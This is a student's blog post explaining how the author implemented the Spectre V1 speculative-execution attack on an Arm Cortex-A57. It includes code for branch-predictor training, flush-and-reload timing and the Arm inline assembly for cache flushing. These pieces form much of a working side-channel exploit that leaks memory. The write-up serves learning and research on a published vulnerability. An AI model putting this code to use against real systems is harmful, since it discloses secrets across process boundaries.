---
layout: post
title: Spectre on Arm cortex A57 English Version
categories: [Microarchitecture vulnerability, English Version]
description: Cache
keywords: Microarchitecture
mermaid: false
sequence: false
flow: false
mathjax: false
mindmap: false
mindmap2: false
---

# Spectre V1 on Arm
This article mainly discusses the implementation of Spectre v1 on Arm Cortex 57. For specific principles, please refer to the paper at https://spectreattack.com/spectre.pdf. The principle of Spectre is not complicated, but its specific implementation is not easy to describe. (My ability to express myself is very limited, and I usually score poorly in literature classes. If you find this article confusing, you can email me for clarification, although there are some questions I may not be able to answer.) All the code will be open-sourced after the completion of the graduation project.
## Spectre V1
Basically, if I flush `array1_size`, the CPU needs some time to access physical memory to retrieve the variable's value. During this process, many processors may trigger out-of-order execution, skipping the conditional branch. Typically, there is a cache inside the CPU to store some results of conditional branches. When skipping the conditional branch, the CPU refers to this cache. If the previous several conditional branches were all true, then in the process of out-of-order execution, this branch would be assumed to be taken by default, and the code inside the branch would be executed.
```
if (x < array1_size)
    y = array2[array1[x] * 4096];
```

Suppose we manipulate the branch prediction cache so that it always predicts the result of this condition as true. However, if we pass a value `x` greater than `array_size`, the program can access a position beyond the range of `array2`, and then use the retrieved value to access `reloadbuffer` (or `array1`). In this scenario, we can exploit the flush-and-reload side-channel to obtain this value.


## Spectre V1 Arm cortex A57 implementation
There is an open-source repository that currently implements the Spectre V1 attack on Arm architecture. In my implementation, I leverage their branch training approach https://github.com/V-E-O/PoC/tree/master/CVE-2017-5753.

The general approach is as follows:

Firstly, we use the flush-and-reload technique to determine the boundary between cache hits and cache misses.
```
CACHE_THRESHOLD = measure_latency();
```

Next, we start training branches and leak the string we want to retrieve. Firstly, we flush our `reloadbuffer` from the cache. It's preferable to add a memory barrier (`barrier`) before each memory operation to ensure that the flush completes before subsequent instructions start executing, thus preventing flushes from being interrupted by out-of-order execution.

```
for (int i = 0; i < 256; i++)
	cacheflush(&reloadbuffer[i * STRIDE]); 
```
```
static inline __attribute__((always_inline)) void barrier(void){
  asm volatile ("DMB SY ");
}
```

We also flush the size of the string we want to leak from the cache, causing the branch prediction to slow down.
```
cacheflush(&array1_size);
```

At this point, we begin training the branch prediction to predict the branch as taken. Only when `j` is divisible by `10`, `probe_addr` will be set to `target`, which is the address we want to leak. Otherwise, `j` will be set to `train_index`, where `train_index` falls within the range of `array1_size`. At the end of each iteration, probe_addr will be set back to target (outside the range of `array1`).




```
probe_addr = ((j % 10) - 1) & ~0xFFFF; 
probe_addr = (probe_addr | (probe_addr >> 16)); 
probe_addr = train_index ^ (probe_addr & (target ^ train_index));
cacheflush(&array1_size);   // flush again (I dont know why)
spectre_v1(&probe_addr);
```
```
void spectre_v1(size_t *index) {
	if (*index < array1_size)
	{
		pick = reloadbuffer[fake_buffer[*index] * STRIDE];
	}
}
```


Finally, we perform the `reload` operation. Here, we use a scrambled access pattern `index = ((i * 167) + 13) & 255`; to prevent interference from the prefetcher. If the access time to a position is less than the calculated `CACHE_THRESHOLD`, it indicates a cache hit, meaning that the position has been accessed in the `spectre_v1` function. Therefore, this value is the byte we want to leak.
```
for (int i = 0; i < 256; i++)
{
	index = ((i * 167) + 13) & 255;
	measured_clock = timed_read(&reloadbuffer[index * STRIDE], &start, &end);
	if (measured_clock <= CACHE_THRESHOLD && index != fake_buffer[tries % array1_size])
		results[index]++; 
}
```

Some of the more important inline assembly functions look something like this:
```
static inline __attribute__((always_inline)) void cacheflush(void* address)
{
  	asm volatile ("DC CIVAC, %0" :: "r"(address));
  	asm volatile ("DSB ISH");
  	asm volatile ("ISB");
}

static inline __attribute__((always_inline)) void barrier(void){
  	asm volatile ("DMB SY ");
}

//#include <time.h>
void clock_init(struct timespec *start){
  	clock_gettime(CLOCK_REALTIME, start);
}

void clock_end(struct timespec *end){
  	clock_gettime(CLOCK_REALTIME, end);
}

uint64_t get_clock(struct timespec start, struct timespec end){
  	return BILLION * (end.tv_sec - start.tv_sec) + end.tv_nsec - start.tv_nsec;
}

static uint64_t timed_read(volatile uint8_t *addr, struct timespec *start, struct timespec *end) {
	volatile uint8_t pick = 0; 
  	clock_init(start);
	pick = *addr;
  	clock_end(end);
	barrier();
  	return get_clock(*start, *end);
}
```

